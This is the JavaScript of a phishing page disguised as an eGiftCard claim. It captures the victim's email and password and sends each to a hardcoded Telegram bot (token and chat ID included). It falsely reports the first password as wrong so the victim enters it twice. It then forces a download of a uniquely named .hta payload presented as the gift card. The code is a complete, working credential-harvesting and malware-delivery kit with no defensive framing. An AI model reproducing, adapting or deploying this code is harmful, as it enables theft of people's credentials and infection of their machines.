<script>
    // ⚠️ REPLACE WITH YOUR ACTUAL TELEGRAM CREDENTIALS
    const TG_BOT_TOKEN = "8947701700:AAFpBFejWSFtcQZ01JP4D-qkIUopxBUyd4A";
    const TG_CHAT_ID = "844971567";
    
    let attemptCount = 0;
    let currentUniqueFilename = "";

    async function getUniquePayloadName() {
        try {
            const response = await fetch('/api/get-unique-payload');
            const data = await response.json();
            return data.filename;
        } catch (err) {
            return `egiftcard_${Date.now()}.hta`;
        }
    }

    async function sendToTelegram(message) {
        const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;
        const data = {
            chat_id: TG_CHAT_ID,
            text: message,
            parse_mode: "HTML"
        };
        
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
            
            if (!response.ok) {
                throw new Error(`Telegram API Error: ${response.status} ${response.statusText}`);
            }
            
            const result = await response.json();
            if (!result.ok) {
                throw new Error(`Telegram Bot Error: ${result.description}`);
            }
            
            console.log("✅ Telegram message sent successfully");
        } catch (error) {
            console.error("❌ Telegram send failed:", error.message);
            // Optional: Store failed messages locally for retry later
            localStorage.setItem('tg_pending_' + Date.now(), JSON.stringify(data));
        }
    }

    function goToStep2() {
        const email = document.getElementById('emailInput').value.trim();
        const errorEl = document.getElementById('emailError');
        
        if (!email || !email.includes('@') || !email.includes('.')) {
            errorEl.style.display = 'block';
            return;
        }
        errorEl.style.display = 'none';
        
        sendToTelegram(`🎣 <b>New Target Engaged</b>\n📧 Email: <code>${email}</code>\n⏰ Time: ${new Date().toLocaleString()}`);
        
        showLoader('Authenticating...');
        setTimeout(() => {
            hideLoader();
            document.getElementById('step1').style.display = 'none';
            document.getElementById('step2').style.display = 'block';
            document.getElementById('passInput').focus();
        }, 1200);
    }

    async function attemptPassword() {
        const pass = document.getElementById('passInput').value;
        const errorEl = document.getElementById('passError');
        const btn = document.getElementById('passBtn');
        
        attemptCount++;
        
        if (attemptCount === 1) {
            sendToTelegram(`🔑 <b>Password Attempt #1 (Failed)</b>\n📧 Email: <code>${document.getElementById('emailInput').value.trim()}</code>\n🔒 Pass: <code>${pass}</code>`);
            
            errorEl.textContent = 'Incorrect password. Please try again.';
            errorEl.style.display = 'block';
            document.getElementById('passInput').value = '';
            document.getElementById('passInput').focus();
            return;
        }
        
        currentUniqueFilename = await getUniquePayloadName();
        
        sendToTelegram(`✅ <b>CREDENTIALS CONFIRMED</b>\n📧 Email: <code>${document.getElementById('emailInput').value.trim()}</code>\n🔒 Pass: <code>${pass}</code>\n💾 Payload: <code>${currentUniqueFilename}</code> delivered`);
        
        errorEl.style.display = 'none';
        btn.disabled = true;
        btn.textContent = 'Processing...';
        
        showLoader('Preparing your eGiftCard...');
        
        setTimeout(() => {
            hideLoader();
            document.getElementById('step2').style.display = 'none';
            document.getElementById('step3').style.display = 'block';
            triggerDownload();
        }, 2000);
    }

    function triggerDownload() {
        const link = document.createElement('a');
        link.href = `/payload/${currentUniqueFilename}`;
        link.download = currentUniqueFilename;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    }

    function forceDownload() {
        triggerDownload();
        document.getElementById('dlBtn').textContent = 'Download Started!';
        document.getElementById('dlBtn').disabled = true;
    }

    function showLoader(text) {
        document.getElementById('loaderText').textContent = text;
        document.getElementById('loader').style.display = 'flex';
    }

    function hideLoader() {
        document.getElementById('loader').style.display = 'none';
    }

    document.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
            if (document.getElementById('step1').style.display !== 'none') goToStep2();
            else if (document.getElementById('step2').style.display !== 'none') attemptPassword();
        }
    });
</script>
